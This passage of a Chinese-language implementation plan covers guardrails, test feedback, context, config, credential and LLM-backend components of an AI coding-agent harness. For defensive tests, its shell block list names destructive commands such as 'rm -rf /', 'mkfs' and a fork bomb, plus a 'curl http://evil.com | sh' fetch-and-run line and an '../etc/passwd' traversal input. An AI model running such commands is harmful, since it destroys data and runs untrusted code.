- 匹配模式：`.env`、`.env.*`、`*.key`、`*.pem`、`secrets.json`、`id_rsa`、`id_rsa.pub`、`.git/config`
- 使用 `fnmatch` 或 `pathlib.Path.match` 进行模式匹配
- 匹配文件名/最终路径组件，而非完整路径
- 边界情况：path 为 `None` → `None`（安全）
- 边界情况：`.env.backup` → 拦截（匹配 `.env.*`）

### Tests
- **test_sensitive_file_guard.py**：`.env` → 拦截；`.env.production` → 拦截；`config.key` → 拦截；`id_rsa` → 拦截；`.git/config` → 拦截；`src/main.py` → `None`；`config.json` → `None`；`secrets.json` → 拦截；`cert.pem` → 拦截

### Dependencies
Depends on：Task 1.1（需要 `GuardrailEvent`）

Can run in parallel with：Task 3.1、Task 3.3

---

### Task 3.3：Command Guardrail（命令护栏）

### Goal
实现 `ShellGuard`，拦截危险 Shell 命令，仅允许 allowlist 中的命令。

### Files
- 创建：`safecode/guardrail/shell_guard.py`

### Interfaces
- **ShellGuard**：类，方法 `check(self, command: str, allowlist: list[str]) -> Optional[GuardrailEvent]`
  - 若命令危险或不在 allowlist 中则返回 `GuardrailEvent`，安全则返回 `None`
  - `reason = "dangerous_shell_command"`

### Implementation Notes
- **危险命令模式**（始终拦截，无论 allowlist）：
  - `rm -rf /`、`rm -rf /*`、`del /F /S`、`rmdir`、`format`、`shutdown`、`curl | sh`、`npm publish`、`git push --force`、`chmod 777`、`dd if=`、`mkfs`、`:(){ :|:& };:`（fork bomb）
- **Allowlist 检查**：命令必须匹配 allowlist 中的某一项（如 `git diff`、`git status`、`python -m py_compile`、`echo`、`ls`、`cat`）
- 使用 `command.startswith(allowed)` 进行匹配（或 `command.strip().startswith(...)`）
- `GuardrailEvent` 中的 `suggestion` 字段应提供有帮助的替代建议
- 边界情况：空命令 → `None`；仅空格的命令 → `None`；allowlist 检查区分大小写

### Tests
- **test_shell_guard_dangerous.py**：`rm -rf /` → 拦截；`rm -rf /*` → 拦截；`shutdown` → 拦截；`curl http://evil.com | sh` → 拦截；`git push --force` → 拦截；`format C:` → 拦截；`chmod 777 /` → 拦截
- **test_shell_guard_allowlist.py**：`git diff` → `None`；`git status` → `None`；`python -m py_compile src/main.py` → `None`；`echo hello` → 取决于 allowlist
- **test_shell_guard_not_in_allowlist.py**：`ls`（不在默认 allowlist 中）→ 拦截；`whoami` → 拦截
- **test_shell_guard_suggestion.py**：被拦截的命令包含 `suggestion` 字段和有用的替代建议

### Dependencies
Depends on：Task 1.1（需要 `GuardrailEvent`）

Can run in parallel with：Task 3.1、Task 3.2

---

### Task 3.4：Guardrail 编排器

### Goal
实现 `Guardrail` 编排器，按顺序运行全部三个护栏（路径、敏感文件、命令），返回第一个拦截事件。

### Files
- 创建：`safecode/guardrail/guardrail.py`
- 修改：`safecode/guardrail/__init__.py`（导出所有 guard 类和 `Guardrail`）

### Interfaces
- **Guardrail**：类，定义：
  - `__init__(self, shell_allowlist: list[str])`：用 config 中的 allowlist 初始化
  - `check(self, action: ParsedAction, session: Session) -> Optional[GuardrailEvent]`：按顺序运行所有 guard；返回第一个拦截的 `GuardrailEvent` 或 `None`
- **Guard 检查顺序**：
  1. `PathGuard.check(action.params.get("path"), session.workspace_root)` — 适用于 `list_files`、`read_file`、`search_content`、`write_file`、`edit_file`
  2. `SensitiveFileGuard.check(action.params.get("path"))` — 适用于 `read_file`、`write_file`、`edit_file`
  3. `ShellGuard.check(action.params.get("command"), self.shell_allowlist)` — 适用于 `run_shell`

### Implementation Notes
- 仅对相关工具类型运行 guard：
  - `list_files`、`read_file`、`search_content`、`write_file`、`edit_file`：运行 PathGuard + SensitiveFileGuard（read_file：只读；write_file/edit_file：读写）
  - `run_shell`：仅运行 ShellGuard
  - `run_tests`：不检查护栏（命令已在 task.yaml 中预配置）
  - `finish`：不检查护栏
- `SensitiveFileGuard` 同时适用于读和写操作
- 护栏事件包含 `action_summary` 描述尝试的操作
- 所有护栏事件 `recoverable = True`（agent 可尝试其他动作）
- `suggestion` 在可能时提供替代方案

### Tests
- **test_guardrail_orchestrator.py**：`read_file("../outside")` → 路径护栏拦截；`read_file(".env")` → 敏感文件护栏拦截；`run_shell("rm -rf /")` → shell 护栏拦截；`read_file("src/main.py")` → `None`（所有护栏通过）；`list_files(".")` → `None`；`run_tests({})` → `None`（无护栏检查）；`finish({})` → `None`
- **test_guardrail_order.py**：路径护栏在敏感文件护栏之前检查；验证第一个拦截的 guard 被返回
- **test_guardrail_integration.py**：与实际工具集成（创建临时工作区，尝试危险动作，验证拦截）

### Dependencies
Depends on：Task 3.1、Task 3.2、Task 3.3、Task 1.1（需要 `ParsedAction`、`Session`）

Can run in parallel with：（无——集成所有 guard）

---

### Task 3.5：Guardrail 与 Agent Loop 集成

### Goal
将 `Guardrail` 接入 `AgentLoop`，用 mock LLM 验证完整的护栏管道。

### Files
- 修改：`safecode/core/agent_loop.py`（将 guardrail stub 替换为真实的 `Guardrail`）

### Interfaces
- 更新 `AgentLoop.__init__` 以接收 `Guardrail` 实例（或从 `RuntimeConfig` 内部创建）
- 无新的公开接口

### Implementation Notes
- 将 Task 1.6 中的 guardrail stub 替换为 Task 3.4 的真实 `Guardrail` 编排器
- Agent loop 已在 Task 1.6 中处理 `GuardrailEvent` 响应：递增 `blocked_count`，创建含护栏事件的 `SessionStep`，继续
- 确保 `blocked_count >= config.guardrail_threshold`（默认 3）通过 Stop Controller 触发 `TERMINATED_BY_GUARDRAIL`

### Tests
- **test_agent_loop_guardrail_block.py**：Mock LLM 尝试 `read_file("../etc/passwd")` → 路径护栏拦截 → `blocked_count` 递增；3 次拦截后 → `final_status = TERMINATED_BY_GUARDRAIL`
- **test_agent_loop_guardrail_sensitive.py**：Mock LLM 尝试 `read_file(".env")` → 敏感文件护栏拦截
- **test_agent_loop_guardrail_shell.py**：Mock LLM 尝试 `run_shell("rm -rf /")` → shell 护栏拦截
- **test_agent_loop_guardrail_recovery.py**：Mock LLM 尝试危险动作，被拦截，然后尝试安全动作 → 安全动作成功

### Dependencies
Depends on：Task 3.4、Task 1.6

Can run in parallel with：（无）

---

## Phase 4：Test Feedback Summarizer（测试反馈闭环）

### Task 4.1：Test Feedback Summarizer

### Goal
实现 `TestFeedbackSummarizer`，将 pytest 输出解析为结构化 `TestFeedback`，并包含历史对比。

### Files
- 创建：`safecode/feedback/__init__.py`
- 创建：`safecode/feedback/summarizer.py`

### Interfaces
- **TestFeedbackSummarizer**：类，定义：
  - `summarize(self, tool_result: ToolResult, session: Session) -> TestFeedback`：解析 pytest 输出，与之前测试结果对比，返回结构化反馈
  - `_parse_pytest_output(self, stdout: str, stderr: str) -> TestFeedback`：将原始 pytest 输出解析为 `TestFeedback`（不含历史对比）
  - `_compare_with_previous(self, current: TestFeedback, session: Session) -> TestFeedback`：将当前结果与上次测试运行对比，填充 `fixed_tests`、`new_failures`、`unchanged_failures`、`progress_summary`、`hint`

### Implementation Notes
- **解析 pytest 输出**：
  - 从 pytest 摘要行提取 `passed_count`、`failed_count`、`skipped_count`（如 `3 passed, 1 failed`）
  - 从 pytest 计时输出提取 `duration_ms`
  - 对每个失败测试，解析：测试名（从 `FAILED` 行）、断言信息（从 `AssertionError`）、traceback 片段（前几行相关行）、文件路径和行号
  - 设置 `status`：`exit_code == 0` 则为 `"passed"`，`exit_code == 1` 则为 `"failed"`，其他 exit_code 则为 `"error"`，tool_result 表示超时则为 `"timeout"`
- **历史对比**：
  - 在 `session.steps` 中查找上一次 `TestFeedback`（最近一个 `test_feedback is not None` 的步骤）
  - `previous_failed_count`：上次测试的 `failed_count`（若无上次则为 `None`）
  - `fixed_tests`：在上次 `failed_tests` 中但不在当前 `failed_tests` 中的测试名
  - `new_failures`：在当前 `failed_tests` 中但不在上次 `failed_tests` 中的测试名
  - `unchanged_failures`：同时存在于当前和上次 `failed_tests` 中的测试名
  - `progress_summary`：英文文本，如 "Previous run: 3 failed. Current: 1 failed. Fixed: 2 tests."
  - `hint`：全部通过 → "All tests pass. Consider calling finish."；失败减少 → "Good progress. Continue fixing remaining failures."；失败增加 → "Failures increased. Review recent changes."；不变 → "Same failures persist. Try a different approach."
- **截断**：若输出过长，将 traceback 截断到关键行；总反馈预算约 2000 字符
- **边界情况**：pytest 输出不可解析 → 创建 `TestFeedback`，`status="error"`，保留原始摘要；无上次测试运行 → `previous_failed_count=None`、`fixed_tests=[]`、`new_failures=[]`、`unchanged_failures=[]`；首次运行全部通过 → `progress_summary` 显示 "All tests passed on first run"

### Tests
- **test_summarizer_parse.py**：给定已知的 pytest 输出（通过）→ 正确的 `passed_count`、`failed_count`、`status="passed"`；失败输出 → 正确的计数，`failed_tests` 填充测试名；混合输出 → 正确的计数
- **test_summarizer_parse_unparseable.py**：乱码输出 → `status="error"`，保留原始摘要
- **test_summarizer_comparison.py**：首次运行 → 无历史对比数据；第二次运行失败减少 → `fixed_tests` 已填充，`previous_failed_count` 已设置；引入新失败 → `new_failures` 已填充；相同失败 → `unchanged_failures` 已填充；`progress_summary` 和 `hint` 正确生成
- **test_summarizer_truncation.py**：很长的 traceback → 截断到预算
- **test_summarizer_timeout.py**：`tool_result` 表示超时 → `status="timeout"`

### Dependencies
Depends on：Task 1.1（需要 `TestFeedback`、`ToolResult`、`Session`、`SessionStep`）

Can run in parallel with：Phase 3 的任务

---

### Task 4.2：Test Feedback 与 Agent Loop 集成

### Goal
将 `TestFeedbackSummarizer` 接入 `AgentLoop`，用 mock LLM 验证反馈闭环。

### Files
- 修改：`safecode/core/agent_loop.py`（将 feedback stub 替换为真实的 `TestFeedbackSummarizer`）

### Interfaces
- 更新 `AgentLoop.__init__` 以接收 `TestFeedbackSummarizer` 实例
- 无新的公开接口

### Implementation Notes
- 在 `run_tests` 工具执行后，调用 `summarizer.summarize(tool_result, session)` 生成 `TestFeedback`
- `TestFeedback` 存储在 `SessionStep` 中，将由 `ContextBuilder`（Phase 5）用于将反馈注入下一个 LLM 上下文
- `hint` 字段引导 LLM 下一步该做什么

### Tests
- **test_feedback_loop_integration.py**（集成测试）：Mock LLM 脚本化序列：
  - 步骤 1：`run_tests` → 失败（3 个测试失败）
  - 步骤 2：`edit_file` → 修复 2 个测试
  - 步骤 3：`run_tests` → 仍有 1 个测试失败
  - 验证步骤 3 的 `TestFeedback` 中 `previous_failed_count=3`、`fixed_tests` 含 2 个名称、`unchanged_failures` 含 1 个名称、`progress_summary` 显示 "Fixed: 2 tests"
  - 步骤 4：`edit_file` → 修复最后 1 个测试
  - 步骤 5：`run_tests` → 全部通过 → `final_status = SUCCESS`

### Dependencies
Depends on：Task 4.1、Task 1.6、Task 2.4、Task 2.6

Can run in parallel with：（无）

---

## Phase 5：Context、Memory、Configuration

### Task 5.1：Context Builder

### Goal
实现 `ContextBuilder`，构造每轮迭代中发送给 LLM 的 `ContextPayload`。

### Files
- 创建：`safecode/context/__init__.py`
- 创建：`safecode/context/builder.py`

### Interfaces
- **ContextBuilder**：类，定义：
  - `__init__(self, config: RuntimeConfig)`：用预算和其他设置初始化
  - `build(self, session: Session) -> ContextPayload`：为下一次 LLM 调用构建上下文负载
  - `_build_system_prompt(self) -> str`：构造包含安全规则的系统提示（不可变）
  - `_summarize_history(self, session: Session) -> str`：压缩早期对话历史
  - `_build_workspace_tree(self, session: Session) -> str`：生成工作区的文件树摘要

### Implementation Notes
- **内容优先级**（从高到低）：
  1. 系统提示和安全规则（绝不截断）
  2. 当前任务目标（来自 `session.task_config.description`）
  3. 最近的 `TestFeedback`（来自最后一个含 `test_feedback` 的步骤）
  4. 最近的 `ToolResult`（来自最后一个步骤）
  5. 最近的文件修改 diff（`recent_diffs`）
  6. 当前工作区文件树摘要
  7. 历史对话摘要（压缩的早期步骤）
- **预算管理**：`context_budget_chars`（默认 8000）为总预算；跟踪累计长度；超出时优先从最低优先级项压缩/丢弃
- **系统提示**：必须包含安全规则、工具使用说明、JSON 输出格式、工作区约束
- **历史摘要**：保留最近 2-3 步的完整内容；将早期步骤压缩为简要摘要（"做了什么，结果是什么"）
- **工作区树**：运行类似 `list_files` 工具的逻辑生成树形字符串；未变化时缓存
- **剥离/脱敏**：上下文中绝不包含 API Key、`.env` 内容或敏感文件内容
- **边界情况**：空 session（无步骤）→ 上下文仅含系统提示 + 任务 + 工作区树；很长的工具结果 → 截断；即使压缩后仍超出上下文预算 → 记录警告并进一步截断

### Tests
- **test_context_builder_empty.py**：空 session → 上下文包含系统提示、任务描述、工作区树，无反馈/历史
- **test_context_builder_with_feedback.py**：含测试反馈的 session → `last_test_feedback` 填充到上下文中
- **test_context_builder_with_guardrail.py**：含护栏事件的 session → `last_guardrail_event` 已填充
- **test_context_builder_budget.py**：含多步的 session → 历史被压缩；系统提示和任务描述永不被截断；总上下文在预算内
- **test_context_builder_sensitive_redaction.py**：上下文中不含 API Key 模式或 `.env` 内容
- **test_context_builder_fields.py**：所有 `ContextPayload` 字段正确填充：`step_id`、`blocked_count`、`remaining_steps`

### Dependencies
Depends on：Task 1.1（需要 `ContextPayload`、`Session`、`RuntimeConfig`）

Can run in parallel with：Task 5.2、Task 5.3

---

### Task 5.2：Memory Manager（Session Trace）

### Goal
实现 `MemoryManager`，持久化并加载 `session_trace.json`，用于跨会话记忆。

### Files
- 创建：`safecode/context/memory.py`

### Interfaces
- **MemoryManager**：类，定义：
  - `save_trace(self, session: Session, output_dir: Path) -> Path`：将 `session_trace.json` 保存到工作区的 `.safecode/` 目录
  - `load_latest_trace(self, workspace_dir: Path) -> Optional[dict]`：加载最近一次会话的 trace 摘要
  - `_build_trace(self, session: Session) -> dict`：构建会话的结构化摘要（不含完整聊天历史）

### Implementation Notes
- `session_trace.json` 结构：
  ```json
  {
    "session_id": "...",
    "final_status": "...",
    "llm_backend": "real|mock",
    "start_time": "...",
    "end_time": "...",
    "total_steps": N,
    "blocked_count": N,
    "invalid_action_count": N,
    "test_summary": { "final_passed": N, "final_failed": N, "final_status": "..." },
    "steps_summary": [{"step_id": N, "tool": "...", "success": true|false, "summary": "..."}, ...],
    "guardrail_events": [{"step_id": N, "reason": "...", "action_summary": "..."}, ...]
  }
  ```
- 保存到：`{workspace_root}/.safecode/session_trace.json`（如需要则创建 `.safecode/` 目录）
- `load_latest_trace` 读取最近的 trace 文件；若无 trace 则返回 `None`
- trace 是**摘要**，而非完整聊天历史——这是跨会话记忆的刻意设计
- 每个工作区的 trace 独立（每个工作区的 `.safecode/` 目录独立）
- **边界情况**：`.safecode/` 目录不存在 → 创建；JSON 序列化失败 → 记录错误，优雅返回；磁盘满 → 处理 `OSError`

### Tests
- **test_memory_save_trace.py**：保存会话 trace → 文件存在于 `.safecode/session_trace.json`；验证 JSON 结构
- **test_memory_load_trace.py**：保存 trace，然后加载 → 返回正确的 dict；无 trace 存在 → `None`
- **test_memory_trace_content.py**：验证 trace 包含所有必需字段；验证 `steps_summary` 计数正确；验证 `guardrail_events` 包含拦截事件
- **test_memory_no_full_history.py**：trace 中不含完整 LLM 请求/响应内容

### Dependencies
Depends on：Task 1.1（需要 `Session`、`SessionStep`）

Can run in parallel with：Task 5.1、Task 5.3

---

### Task 5.3：Task Config Loader

### Goal
实现 `TaskConfigLoader`，解析 `task.yaml` 并返回经过验证的 `TaskConfig`。

### Files
- 创建：`safecode/config/__init__.py`
- 创建：`safecode/config/task_loader.py`

### Interfaces
- **TaskConfigLoader**：类，定义：
  - `load(self, path: Path) -> TaskConfig`：解析并验证 `task.yaml`
  - `_validate(self, config: dict) -> list[str]`：验证必填字段、工具名称等；返回验证错误列表

### Implementation Notes
- 使用 `PyYAML`（`yaml.safe_load`）解析 YAML
- **必填字段**：`id`、`title`、`task_type`、`workspace_template`、`test_command`
- **验证**：
  - 所有 `allowed_tools` 条目必须是有效工具名（来自 Task 1.3 的 `TOOL_SCHEMAS`）
  - `task_type` 必须为：`complete_function`、`fix_bug`、`add_feature` 之一
  - 若提供 `max_iterations`，必须为正整数
  - 若提供 `timeout_seconds`，必须为正整数
- **ValidationError**（自定义异常）：包含错误信息列表
- **边界情况**：YAML 语法错误 → 含解析错误信息的 `ValidationError`；空文件 → `ValidationError`；缺少必填字段 → 含具体字段名的 `ValidationError`；`allowed_tools` 中有未知工具 → `ValidationError`

### Tests
- **test_task_loader_valid.py**：有效的最小 `task.yaml` → 包含所有字段的 `TaskConfig`；有效的完整 `task.yaml` → 所有字段已填充
- **test_task_loader_missing_required.py**：缺少 `id` → `ValidationError`；缺少 `workspace_template` → `ValidationError`
- **test_task_loader_invalid_tool.py**：`allowed_tools` 包含未知工具 → `ValidationError`
- **test_task_loader_invalid_yaml.py**：格式错误的 YAML → `ValidationError`
- **test_task_loader_invalid_type.py**：`task_type` 不在枚举中 → `ValidationError`

### Dependencies
Depends on：Task 1.1（需要 `TaskConfig`）、Task 1.3（需要 `TOOL_SCHEMAS`）

Can run in parallel with：Task 5.1、Task 5.2

---

### Task 5.4：Configuration Manager

### Goal
实现 `ConfigurationManager`，将来自 CLI 参数、环境变量、`config.yaml` 和内置默认值的配置合并为 `RuntimeConfig`。

### Files
- 创建：`safecode/config/config_manager.py`

### Interfaces
- **ConfigurationManager**：类，定义：
  - `load(self, cli_overrides: Optional[dict] = None) -> RuntimeConfig`：加载并合并所有配置来源
  - `_load_defaults(self) -> RuntimeConfig`：返回内置默认值
  - `_load_config_yaml(self) -> dict`：若存在则从 `config.yaml` 加载
  - `_load_env_vars(self) -> dict`：从环境变量加载（`SAFECODE_*` 前缀）
  - `_merge(self, *sources) -> RuntimeConfig`：按优先级合并来源
  - `_validate(self, config: RuntimeConfig) -> None`：验证类型和范围

### Implementation Notes
- **配置来源按优先级**（从高到低）：
  1. CLI 参数（`--max-iterations`、`--model` 等）
  2. 环境变量（`SAFECODE_MODEL`、`SAFECODE_BASE_URL` 等）
  3. `config.yaml` 文件（仅非敏感配置）
  4. 内置默认值（来自 SPEC §3.15）
- **默认值**：
  - `base_url`：`"https://njusehub.info/v1"`
  - `model`：`"qwen3.7-max"`
  - `temperature`：`0`
  - `max_iterations`：`10`
  - `timeout_seconds`：`300`
  - `test_command`：`"pytest"`
  - `context_budget_chars`：`8000`
  - `guardrail_threshold`：`3`
  - `shell_allowlist`：`["git diff", "git status", "python -m py_compile"]`
- **验证**：`max_iterations` > 0；`temperature` 在 [0, 2] 内；`timeout_seconds` > 0；`context_budget_chars` > 0；`guardrail_threshold` >= 1；`shell_allowlist` 为字符串列表
- **API Key**：`api_key` 不从 `config.yaml` 加载；仅从 keyring、环境变量 `SAFECODE_API_KEY` 或 `.env` 文件加载——由 `CredentialManager` 处理（Task 6.3）
- **边界情况**：`config.yaml` 不存在 → 跳过；环境变量类型无效 → 验证错误；CLI 覆盖 `shell_allowlist` → 合并还是替换？（为简单起见，替换）

### Tests
- **test_config_manager_defaults.py**：无配置来源 → 包含所有默认值的 `RuntimeConfig`
- **test_config_manager_env_vars.py**：设置 `SAFECODE_MODEL`、`SAFECODE_MAX_ITERATIONS` → 覆盖默认值
- **test_config_manager_cli_overrides.py**：CLI 覆盖 → 最高优先级
- **test_config_manager_config_yaml.py**：`config.yaml` 存在 → 值覆盖默认值但不覆盖环境变量
- **test_config_manager_validation.py**：`max_iterations=0` → 验证错误；`temperature=3` → 验证错误
- **test_config_manager_priority.py**：验证 4 来源优先级顺序

### Dependencies
Depends on：Task 1.1（需要 `RuntimeConfig`）

Can run in parallel with：Task 5.3

---

### Task 5.5：Session Manager

### Goal
实现 `SessionManager`，编排完整的会话生命周期：创建工作区、创建会话、运行 agent loop、持久化 trace、清理。

### Files
- 创建：`safecode/core/session_manager.py`

### Interfaces
- **SessionManager**：类，定义：
  - `__init__(self, config: RuntimeConfig, llm_backend: LLMBackend)`：用 config 和 LLM backend 初始化
  - `run(self, task_config: TaskConfig, keep_session: bool = False) -> Session`：完整会话生命周期
  - `_create_session(self, task_config: TaskConfig) -> Session`：创建新的 Session 对象
  - `_setup_workspace(self, task_config: TaskConfig) -> Path`：从模板设置工作区
  - `_run_agent_loop(self, session: Session) -> Session`：运行 Agent Loop
  - `_persist_trace(self, session: Session)`：保存会话 trace
  - `_cleanup(self, session: Session, keep: bool)`：清理工作区

### Implementation Notes
- 集成：`WorkspaceManager`、`AgentLoop`、`MemoryManager`、`Guardrail`、`TestFeedbackSummarizer`、`ContextBuilder`、`ToolDispatcher`
- `run` 方法流程：
  1. 从 `TaskConfig` 创建 `Session`
  2. 将工作区模板复制到临时目录
  3. 将 `TaskConfig` 覆盖合并到 `RuntimeConfig`（任务级 `max_iterations`、`timeout_seconds` 等覆盖全局配置）
  4. 运行 `AgentLoop.run(session, llm_backend, effective_config)`
  5. 设置 `session.end_time`
  6. 持久化 `session_trace.json`
  7. 清理工作区（除非 `keep_session=True`）
  8. 返回 session
- **任务级配置覆盖**：`task_config.max_iterations` 若已设置则覆盖 `config.max_iterations`；`timeout_seconds`、`allowed_tools`、`forbidden_tools` 同理
- **边界情况**：工作区模板不存在 → 明确的错误；agent loop 抛出异常 → 仍持久化 trace 并清理；session 已有 `final_status` → 不运行 agent loop

### Tests
- **test_session_manager_basic.py**（集成测试）：用 mock LLM 创建 `SessionManager`，运行任务 → 返回 `Session` 并设置 `final_status`，步骤已填充
- **test_session_manager_keep_session.py**：`keep_session=True` → 运行后工作区目录保留
- **test_session_manager_cleanup.py**：`keep_session=False`（默认）→ 运行后工作区目录被删除
- **test_session_manager_trace.py**：会话结束后，工作区中存在 `.safecode/session_trace.json`
- **test_session_manager_error_template.py**：模板不存在 → 抛出明确的错误

### Dependencies
Depends on：Task 1.5（WorkspaceManager）、Task 1.6（AgentLoop）、Task 3.5（Guardrail 集成）、Task 4.2（Feedback 集成）、Task 5.1（ContextBuilder）、Task 5.2（MemoryManager）、Task 5.3（TaskConfigLoader）、Task 5.4（ConfigurationManager）、Task 2.6（Tool Registry）

Can run in parallel with：（无——集成所有主要组件）

---

## Phase 6：LLM Backend

### Task 6.1：Credential Manager

### Goal
实现 `CredentialManager`，使用 Python keyring 安全存储和检索 API Key，并支持环境变量和 `.env` 回退。

### Files
- 创建：`safecode/auth/__init__.py`
- 创建：`safecode/auth/credentials.py`

### Interfaces
- **CredentialManager**：类，定义：
  - `get_api_key(self) -> Optional[str]`：按优先级从 keyring → 环境变量 → `.env` 获取 API Key
  - `set_api_key(self, key: str) -> None`：存储到系统 keyring
  - `clear_api_key(self) -> None`：从 keyring 中移除
  - `status(self) -> str`：返回 `"configured"` 或 `"missing"`（绝不返回 key 本身）

### Implementation Notes
- **优先级**：keyring → `SAFECODE_API_KEY` 环境变量 → `.env` 文件
- 使用 `keyring` 库：`keyring.set_password("safecode-harness", "api_key", key)` 和 `keyring.get_password("safecode-harness", "api_key")`
- `.env` 加载：读取当前目录的 `.env` 文件，解析 `SAFECODE_API_KEY=...` 行
- `set_api_key`：使用 `getpass.getpass("Enter API Key: ")` 隐藏输入
- `status`：绝不打印/返回 key 本身
- **边界情况**：keyring 后端不可用（如无头 Linux）→ 回退到环境变量/`.env`；keyring 抛出异常 → 捕获并回退；`.env` 文件不存在 → 跳过；`.env` 中无 `SAFECODE_API_KEY` → 跳过

### Tests
- **test_credentials_keyring.py**：Mock `keyring.get_password` → 返回 mock key；`get_api_key()` 返回 key；`status()` 返回 `"configured"`
- **test_credentials_env_var.py**：Mock keyring 返回 None，设置 `SAFECODE_API_KEY` 环境变量 → `get_api_key()` 返回环境变量值
- **test_credentials_dotenv.py**：创建临时 `.env` 文件 → `get_api_key()` 从 `.env` 读取
- **test_credentials_missing.py**：所有来源为空 → `get_api_key()` 返回 `None`；`status()` 返回 `"missing"`
- **test_credentials_priority.py**：Keyring 有 key，环境变量有不同 key → keyring 优先
- **test_credentials_clear.py**：`clear_api_key()` → `get_api_key()` 回退到环境变量
- **test_credentials_status_no_leak.py**：`status()` 绝不返回实际 key 值

### Dependencies
Depends on：（无——仅使用 keyring 和标准库）

Can run in parallel with：Task 6.2

---

### Task 6.2：RealLLM Backend

### Goal
实现 `RealLLM`，调用 OpenAI 兼容 API（Token Hub）并返回 LLM 响应。

### Files
- 创建：`safecode/llm/real_llm.py`

### Interfaces
- **RealLLM**（继承 `LLMBackend`）：
  - `__init__(self, config: RuntimeConfig, credential_manager: CredentialManager)`：用 config 和凭据初始化
  - `query(self, context: ContextPayload) -> str`：将上下文发送到 LLM API，返回响应文本
  - `_build_messages(self, context: ContextPayload) -> list[dict]`：构建 API 调用的 messages 数组
  - `_call_api(self, messages: list[dict]) -> str`：执行实际的 HTTP 请求

### Implementation Notes
- 使用 `httpx`（或 `openai` Python 库）进行 HTTP 调用
- **API 调用**：POST 到 `{config.base_url}/chat/completions`，请求体：
  ```json
  {
    "model": config.model,
    "messages": [{"role": "system", "content": system_prompt}, {"role": "user", "content": task_context}],
    "temperature": config.temperature
  }
  ```
- **认证**：`Authorization: Bearer {api_key}` 头
- **超时**：单次 API 调用 60 秒
- **错误处理**：HTTP 错误 → 抛出含状态码和消息的 `LLMError`；超时 → 抛出 `LLMTimeoutError`；API 返回错误响应 → 抛出含 API 错误消息的 `LLMError`
- **响应提取**：`response["choices"][0]["message"]["content"]`
- **边界情况**：API 返回空响应 → `LLMError`；API key 为 `None` → `LLMError("API key not configured")`；网络错误 → 含连接错误详情的 `LLMError`
- `_build_messages` 方法将 `ContextPayload` 转换为 OpenAI API 期望的 messages 格式

### Tests
- **test_real_llm_build_messages.py**：给定 `ContextPayload`，验证 messages 数组结构包含系统提示和用户内容；验证内容包含任务描述、测试反馈、工具结果
- **test_real_llm_api_call.py**：Mock `httpx` 响应 → 验证正确的 URL、headers、body；验证响应提取
- **test_real_llm_error.py**：Mock HTTP 错误 → 抛出 `LLMError`；Mock 超时 → 抛出 `LLMTimeoutError`；Mock API 错误响应 → 抛出 `LLMError`
- **test_real_llm_no_api_key.py**：Credential manager 返回 `None` → 抛出 `LLMError`

### Dependencies
Depends on：Task 1.1（需要 `ContextPayload`）、Task 1.2（需要 `LLMBackend`）、Task 6.1（需要 `CredentialManager`）、Task 5.4（需要 `RuntimeConfig`）

Can run in parallel with：Task 6.3

---

### Task 6.3：MockLLM Backend

### Goal
实现 `MockLLM`，支持两种模式：scripted（从列表返回动作）和 rule-based（根据上下文谓词返回动作）。

### Files
- 创建：`safecode/llm/mock_llm.py`

### Interfaces
- **MockLLM**（继承 `LLMBackend`）：
  - **Scripted 模式**：`__init__(self, actions: list[dict])` — 每个 `dict` 为 `{"tool": str, "params": dict, "thought_summary": Optional[str]}`
  - **Rule-based 模式**：`__init__(self, rules: list[Rule])` — 每个 `Rule` 为 `(predicate: Callable[[ContextPayload], bool], action: dict)`
  - `query(self, context: ContextPayload) -> str`：以 JSON 字符串形式返回下一个动作
- **Rule**：命名元组或 dataclass，包含 `predicate: Callable[[ContextPayload], bool]` 和 `action: dict`

### Implementation Notes
- **Scripted 模式**：`_action_index` 计数器；每次 `query` 调用返回 `json.dumps(actions[_action_index])` 并递增；若索引超出列表，返回 `finish` 动作
- **Rule-based 模式**：遍历 `rules`；第一个 `predicate(context)` 返回 `True` 的 → 返回 `json.dumps(rule.action)`；若无规则匹配 → 返回 `finish` 动作
- 两种模式均为**确定性**的：相同输入始终产生相同输出
- 返回的 JSON 字符串必须能被 `ActionParser`（Task 1.3）解析
- **边界情况**：空 actions 列表 → `query` 返回 `finish`；无规则匹配 → `finish`；`predicate` 抛出异常 → 记录并跳到下一条规则

### Tests
- **test_mock_llm_scripted.py**：创建 3 个动作 → `query` 按顺序返回动作 1、2、3；第 4 次调用返回 `finish`；验证 JSON 有效
- **test_mock_llm_scripted_empty.py**：空 actions → `query` 返回 `finish`
- **test_mock_llm_rule_based.py**：规则谓词 `lambda ctx: ctx.step_id == 0` → 步骤 0 返回动作 A，步骤 1 返回 `finish`；检查 `last_test_feedback.failed_count > 0` 的规则 → 测试失败时返回 `edit_file`
- **test_mock_llm_rule_based_no_match.py**：无规则匹配 → 返回 `finish`
- **test_mock_llm_deterministic.py**：相同上下文 → 每次相同输出

### Dependencies
Depends on：Task 1.1（需要 `ContextPayload`）、Task 1.2（需要 `LLMBackend`）

Can run in parallel with：Task 6.2

---

### Task 6.4：LLM Backend 集成

### Goal
将 `RealLLM` 和 `MockLLM` 接入 `SessionManager` 和 CLI 入口点。

### Files
- 修改：`safecode/llm/__init__.py`（导出所有 backend）
- 创建：`safecode/llm/factory.py`

### Interfaces
- **create_llm_backend(config: RuntimeConfig, credential_manager: CredentialManager, mock: bool = False, mock_actions: Optional[list[dict]] = None, mock_rules: Optional[list[Rule]] = None) -> LLMBackend**：工厂函数，创建适当的 backend
- 若 `mock=True` 且提供了 `mock_actions` → `MockLLM(actions=mock_actions)`
- 若 `mock=True` 且提供了 `mock_rules` → `MockLLM(rules=mock_rules)`
- 若 `mock=False` → `RealLLM(config, credential_manager)`

### Implementation Notes
- 简单的工厂函数，无复杂逻辑
- `mock_actions` 和 `mock_rules` 互斥；若同时提供则抛出 `ValueError`

### Tests
- **test_llm_factory.py**：`mock=True` 含 actions → 返回 `MockLLM`；`mock=True` 含 rules → 返回 `MockLLM`；`mock=False` → 返回 `RealLLM`；同时提供 actions 和 rules → `ValueError`

### Dependencies
Depends on：Task 6.2、Task 6.3

Can run in parallel with：（无）

---

## Phase 7：CLI 和 WebUI

### Task 7.1：CLI——Auth 命令

### Goal
实现 `safecode auth` 子命令：`set`、`status`、`clear`。

### Files
- 创建：`safecode/cli/__init__.py`
- 创建：`safecode/cli/main.py`
- 创建：`safecode/cli/auth.py`

### Interfaces
- **CLI App**（`main.py`）：包含子命令的 Typer 应用
- **auth**（`auth.py`）：Typer 子命令组，包含：
  - `safecode auth set`：交互式提示输入 API Key，保存到 keyring
  - `safecode auth status`：打印 "API Key: configured" 或 "API Key: missing"
  - `safecode auth clear`：从 keyring 中移除 API Key

### Implementation Notes
